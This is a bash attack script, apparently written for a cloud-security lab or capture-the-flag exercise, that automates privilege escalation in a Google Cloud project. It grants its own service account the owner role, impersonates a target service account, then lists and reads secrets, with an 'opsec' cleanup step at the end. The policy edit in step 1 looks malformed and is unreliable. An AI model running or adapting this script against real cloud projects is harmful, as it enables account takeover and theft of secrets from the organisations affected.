#!/bin/bash
# gcp-escalation-chain-poc.sh
# Automates GCP escalation using enumerated perms
# 1. Self-grant owner via setIamPolicy
# 2. Impersonate a target SA via actAs/getAccessToken
# 3. Enum and read secrets
# Usage: ./gcp-escalation-chain-poc.sh <target-sa-email> <secret-name>

set -euo pipefail

PROJECT_ID="gcp-labs-6db1oc31"
CURRENT_SA="$(gcloud auth list --filter=status:ACTIVE --format='value(account)')"
TARGET_SA="${1:-default-compute@gcp-labs-6db1oc31.iam.gserviceaccount.com}"  # Edit or pass as arg
SECRET_NAME="${2:-flag-secret}"  # Edit or pass as arg

echo "Starting escalation as $CURRENT_SA in $PROJECT_ID"
echo "Target SA: $TARGET_SA"
echo "Secret: $SECRET_NAME"
echo ""

# Step 1: Self-grant owner
echo "[*] Step 1: Self-grant roles/owner via setIamPolicy"
gcloud projects get-iam-policy "$PROJECT_ID" > policy.yaml
echo "- members:" >> policy.yaml
echo "  - serviceAccount:$CURRENT_SA" >> policy.yaml
echo "  role: roles/owner" >> policy.yaml
gcloud projects set-iam-policy "$PROJECT_ID" policy.yaml
rm policy.yaml
echo "  Success - now owner"
echo ""

# Step 2: Impersonate target SA
echo "[*] Step 2: Impersonate $TARGET_SA via actAs/getAccessToken"
gcloud config set auth/impersonate_service_account "$TARGET_SA"
gcloud auth list  # Verify
echo "  Success - now running as $TARGET_SA"
echo ""

# Step 3: Enum and read secrets
echo "[*] Step 3: Enum secrets via secrets.list/versions.access"
gcloud secrets list
gcloud secrets versions access latest --secret="$SECRET_NAME"
echo "  Success - secrets accessed"
echo ""

# Cleanup (opsec)
echo "Cleanup:"
gcloud config unset auth/impersonate_service_account
echo "Done. You have full access."
